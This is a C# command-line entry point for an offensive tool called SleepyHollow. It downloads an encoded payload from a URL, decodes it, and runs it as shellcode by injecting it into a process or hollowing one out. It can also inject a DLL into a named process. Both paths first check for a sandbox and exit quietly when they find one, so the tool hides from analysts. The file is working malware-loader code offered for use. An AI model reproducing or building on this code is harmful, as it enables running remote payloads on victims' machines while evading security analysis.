using SleepyHollow;
using System.CommandLine;


var payloadOption = new Option<string>(
    name: "--payload",
    description: "The file to download and execute");
payloadOption.AddAlias("-p");

var methodOption = new Option<string>(
    name: "--method",
    description: "Execution method").FromAmong("inject", "hollow");
methodOption.AddAlias("-m");

var scCommand = new Command("sc", "Injects and runs shellcode"){
    payloadOption,
    methodOption
};

var dllName = new Argument<string>("dllName", "The DLL to inject");
var processName = new Argument<string>("processName", "The process to inject into");
var dllCommand = new Command("dll", "Injects and runs DLL"){
    processName,
    dllName
};

var rootCommand = new RootCommand("SleepyHollow");
var skipEvasionOption = new Option<bool>("--skip-evasion", "Do not perform sandbox evasion checks");
var debugOption = new Option<bool>("--debug", "Enable debug logging");
rootCommand.AddGlobalOption(skipEvasionOption);
rootCommand.AddGlobalOption(debugOption);
rootCommand.AddCommand(scCommand);
rootCommand.AddCommand(dllCommand);


scCommand.SetHandler(async (url, method, skipEvasion, debug) =>
{
    if (!skipEvasion && EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }
    if (debug) Console.WriteLine($"Downloading {url}...");
    var httpClient = new HttpClient();
    var data = await httpClient.GetStringAsync(url);
    if (debug) Console.WriteLine($"Downloaded {data.Length} bytes");
    var buf = Decoder.DecodeString(data);
    if (debug) Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
    var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
    if (inject)
        await InjectProcess.Run(buf, debug: debug);
    else
        await HollowProcess.Run(buf, debug: debug);
}, payloadOption, methodOption, skipEvasionOption, debugOption);

dllCommand.SetHandler(async (processName, dllName, skipEvasion, debug) =>
{
    if (!skipEvasion && EvasionCheck.Detected)
    {
        Console.WriteLine("Have a nice day!");
        Environment.Exit(0);
    }

    await InjectDLL.Run(dllName, processName, debug);
}, processName, dllName, skipEvasionOption, debugOption);

await rootCommand.InvokeAsync(args);